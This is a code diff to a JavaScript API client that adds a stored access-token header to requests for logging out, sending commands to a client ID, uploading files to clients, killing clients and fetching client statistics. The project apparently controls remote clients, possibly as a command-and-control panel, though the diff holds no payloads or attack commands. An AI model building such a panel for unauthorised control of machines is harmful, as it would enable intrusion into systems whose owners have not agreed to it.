@@ -1,8 +1,10 @@
 import axios from "../axios";
-// const defaultAxios = require('axios')
 
 export const logout = async () => {
     const result = await axios({
+        headers: {
+            'x-access-token':localStorage.getItem('token')
+        },
         method: 'get',
         url: '/api/logout',
         timeout: 100
@@ -38,6 +40,9 @@ export const register = async (values) => {
 export const sendCommand = async (clientId, command) => {
     const result = await axios({
         method: 'post',
+        headers: {
+            'x-access-token':localStorage.getItem('token')
+        },
         url: "/api/commands/add",
         data: {
             client_id: clientId,
@@ -52,6 +57,7 @@ export const uploadFile = async (formData, clientId) => {
         headers: {
             "client_id": clientId,
             "Content-Type": "multipart/form-data",
+            "x-access-token":localStorage.getItem('token')
         },
     }).then().catch(err => err);
     return result.status === 200;
@@ -60,6 +66,9 @@ export const uploadFile = async (formData, clientId) => {
 export const killClient = async (clientId) => {
     const result = await axios({
         method: 'post',
+        headers: {
+            'x-access-token':localStorage.getItem('token')
+        },
         url: "/api/clients/kill",
         data: {
             client_id: clientId,
@@ -70,6 +79,9 @@ export const killClient = async (clientId) => {
 
 export const checkToken = async () => {
     const result = await axios({
+        headers: {
+            'x-access-token':localStorage.getItem('token')
+        },
         method: 'get',
         url: "/web/auth"
     });
@@ -78,6 +90,9 @@ export const checkToken = async () => {
 
 export const getStatistics = async () => {
     const statistics = await axios({
+        headers: {
+            'x-access-token':localStorage.getItem('token')
+        },
         method: 'get',
         url: "/api/clients/statistics"
     })
